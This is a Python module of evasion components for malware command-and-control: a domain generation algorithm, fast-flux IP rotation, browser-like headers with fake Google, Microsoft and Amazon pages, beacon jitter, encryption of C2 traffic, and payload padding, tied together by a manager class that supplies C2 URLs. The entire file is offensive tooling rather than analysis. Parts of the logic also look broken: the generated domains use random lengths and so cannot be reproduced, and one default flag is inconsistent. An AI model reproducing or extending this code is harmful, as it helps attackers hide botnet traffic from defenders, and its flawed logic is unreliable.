#!/usr/bin/env python3
"""
Stealth Techniques
Features: DGA, Fast-Flux, Traffic Mimicry, Jitter, Encryption
"""

import hashlib
import time
import random
import base64
import os
from typing import List, Dict, Optional
import socket
import dns.resolver

class DomainGenerationAlgorithm:
    """Domain Generation Algorithm (DGA) untuk C2"""
    
    def __init__(self, seed: str = "c2_secret_seed", tlds: List[str] = None):
        self.seed = seed
        self.tlds = tlds or ['.com', '.org', '.net', '.info', '.biz', '.cc', '.io']
        self.current_domains = []
        self.update_domains()
    
    def generate_domain(self, date_offset: int = 0) -> str:
        """Generate domain based on current date"""
        timestamp = int(time.time() // 86400) + date_offset
        data = f"{self.seed}{timestamp}"
        hash_val = hashlib.sha256(data.encode()).hexdigest()
        
        domain_len = random.randint(8, 15)
        domain = hash_val[:domain_len]
        tld = self.tlds[int(hash_val[0], 16) % len(self.tlds)]
        return f"{domain}{tld}"
    
    def update_domains(self, count: int = 10):
        """Update list of generated domains"""
        self.current_domains = [self.generate_domain(i) for i in range(count)]
    
    def get_domain(self, index: int = 0) -> str:
        """Get domain by index"""
        if not self.current_domains:
            self.update_domains()
        return self.current_domains[index % len(self.current_domains)]
    
    def get_next_domain(self) -> str:
        """Get next domain (rotate)"""
        domain = self.get_domain()
        self.update_domains()  # Refresh for next time
        return domain


class FastFlux:
    """Fast-Flux technique untuk C2"""
    
    def __init__(self, domains: List[str] = None):
        self.domains = domains or []
        self.current_ip = None
        self.flux_interval = 300  # 5 minutes
        self.last_update = 0
        self.ip_cache = {}
    
    def add_domain(self, domain: str):
        """Add domain to flux list"""
        if domain not in self.domains:
            self.domains.append(domain)
    
    def resolve_domain(self, domain: str) -> List[str]:
        """Resolve domain to IPs"""
        try:
            import dns.resolver
            answers = dns.resolver.resolve(domain, 'A')
            return [str(answer) for answer in answers]
        except:
            # Fallback to socket
            try:
                return [socket.gethostbyname(domain)]
            except:
                return []
    
    def get_ips_for_domain(self, domain: str) -> List[str]:
        """Get IPs for domain with caching"""
        if domain in self.ip_cache:
            ips, timestamp = self.ip_cache[domain]
            if time.time() - timestamp < 60:  # Cache for 1 minute
                return ips
        
        ips = self.resolve_domain(domain)
        self.ip_cache[domain] = (ips, time.time())
        return ips
    
    def get_current_ip(self) -> Optional[str]:
        """Get current IP (rotated)"""
        if time.time() - self.last_update > self.flux_interval:
            self.rotate()
        return self.current_ip
    
    def rotate(self) -> Optional[str]:
        """Rotate to new IP"""
        if self.domains:
            domain = random.choice(self.domains)
            ips = self.get_ips_for_domain(domain)
            if ips:
                self.current_ip = random.choice(ips)
                self.last_update = time.time()
                return self.current_ip
        return None


class TrafficMimicry:
    """Mimic legitimate traffic patterns"""
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    
    @staticmethod
    def generate_user_agent() -> str:
        """Generate realistic user agent"""
        return random.choice(TrafficMimicry.USER_AGENTS)
    
    @staticmethod
    def generate_random_data(length: int = 100) -> bytes:
        """Generate random data for padding"""
        return bytes(random.randint(0, 255) for _ in range(length))
    
    @staticmethod
    def generate_legitimate_headers() -> Dict:
        """Generate legitimate HTTP headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'User-Agent': TrafficMimicry.generate_user_agent()
        }
    
    @staticmethod
    def generate_legitimate_response() -> str:
        """Generate legitimate-looking HTTP response"""
        responses = [
            '<html><head><title>Google</title></head><body><h1>Search</h1></body></html>',
            '<html><head><title>Microsoft</title></head><body><h1>Sign in</h1></body></html>',
            '<html><head><title>Cloudflare</title></head><body><h1>Checking browser</h1></body></html>',
            '<html><head><title>Amazon</title></head><body><h1>Sign in</h1></body></html>',
            '{"status":"ok","data":null}',
            '{"success":true,"message":"Operation completed"}'
        ]
        return random.choice(responses)


class StealthJitter:
    """Jitter untuk beacon timing"""
    
    def __init__(self, base_interval: int = 60, jitter_percent: float = 0.3):
        self.base_interval = base_interval
        self.jitter_percent = jitter_percent
        self.seed = random.randint(0, 1000)
    
    def get_next_interval(self) -> float:
        """Get next interval with jitter"""
        jitter_range = self.base_interval * self.jitter_percent
        jitter = random.uniform(-jitter_range, jitter_range)
        interval = self.base_interval + jitter
        return max(0.1, interval)
    
    def get_sleep_time(self) -> float:
        """Alias for get_next_interval"""
        return self.get_next_interval()


class EncryptedC2:
    """Encryption untuk C2 communication"""
    
    def __init__(self, key: Optional[bytes] = None):
        self.key = key or self.generate_key()
        self.cipher = None
        try:
            from cryptography.fernet import Fernet
            self.cipher = Fernet(self.key)
            self.use_fernet = True
        except:
            self.use_fernet = False
    
    @staticmethod
    def generate_key() -> bytes:
        """Generate encryption key"""
        try:
            from cryptography.fernet import Fernet
            return Fernet.generate_key()
        except:
            return base64.urlsafe_b64encode(os.urandom(32))
    
    def encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data"""
        if self.use_fernet and self.cipher:
            try:
                return self.cipher.encrypt(data)
            except:
                pass
        # Fallback: simple XOR
        key = self.key[:32]
        return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])
    
    def decrypt_data(self, data: bytes) -> bytes:
        """Decrypt data"""
        if self.use_fernet and self.cipher:
            try:
                return self.cipher.decrypt(data)
            except:
                pass
        # Fallback: simple XOR
        key = self.key[:32]
        return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])


class StealthManager:
    """Manager untuk semua stealth techniques"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.dga = DomainGenerationAlgorithm(
            self.config.get('dga_seed', 'c2_secret_seed')
        )
        self.fast_flux = FastFlux(
            self.config.get('flux_domains', [])
        )
        self.jitter = StealthJitter(
            self.config.get('base_interval', 60),
            self.config.get('jitter_percent', 0.3)
        )
        self.encryption = EncryptedC2()
        self.current_user_agent = TrafficMimicry.generate_user_agent()
        self.rotation_count = 0
    
    def get_headers(self) -> Dict:
        """Get headers dengan mimicry"""
        headers = TrafficMimicry.generate_legitimate_headers()
        headers['User-Agent'] = self.current_user_agent
        return headers
    
    def get_c2_url(self) -> str:
        """Get C2 URL (dengan DGA)"""
        if self.config.get('use_dga', True):
            domain = self.dga.get_next_domain()
            if self.config.get('use_fast_flux', True):
                ip = self.fast_flux.get_current_ip()
                if ip:
                    return f"https://{ip}/"
            return f"https://{domain}/"
        return self.config.get('c2_url', 'https://c2.example.com/')
    
    def rotate_user_agent(self):
        """Rotate user agent"""
        self.current_user_agent = TrafficMimicry.generate_user_agent()
        self.rotation_count += 1
    
    def get_jitter_sleep(self) -> float:
        """Get sleep time with jitter"""
        return self.jitter.get_sleep_time()
    
    def pad_payload(self, payload: bytes) -> bytes:
        """Add padding to payload"""
        if self.config.get('use_padding', True):
            min_padding = self.config.get('min_padding', 100)
            max_padding = self.config.get('max_padding', 500)
            padding_len = random.randint(min_padding, max_padding)
            padding = TrafficMimicry.generate_random_data(padding_len)
            return payload + padding
        return payload
    
    def encrypt_c2_data(self, data: bytes) -> bytes:
        """Encrypt C2 data"""
        if self.config.get('use_encryption', True):
            return self.encryption.encrypt_data(data)
        return data
    
    def decrypt_c2_data(self, data: bytes) -> bytes:
        """Decrypt C2 data"""
        if self.config.get('use_encryption', True):
            return self.encryption.decrypt_data(data)
        return data
    
    def get_status(self) -> Dict:
        """Get stealth status"""
        return {
            'current_ua': self.current_user_agent,
            'rotation_count': self.rotation_count,
            'dga_enabled': self.config.get('use_dga', True),
            'fast_flux_enabled': self.config.get('use_fast_flux', False),
            'encryption_enabled': self.config.get('use_encryption', True),
            'padding_enabled': self.config.get('use_padding', True),
            'domains': self.dga.current_domains[:5],
            'current_ip': self.fast_flux.current_ip,
            'jitter_interval': self.jitter.base_interval
        }
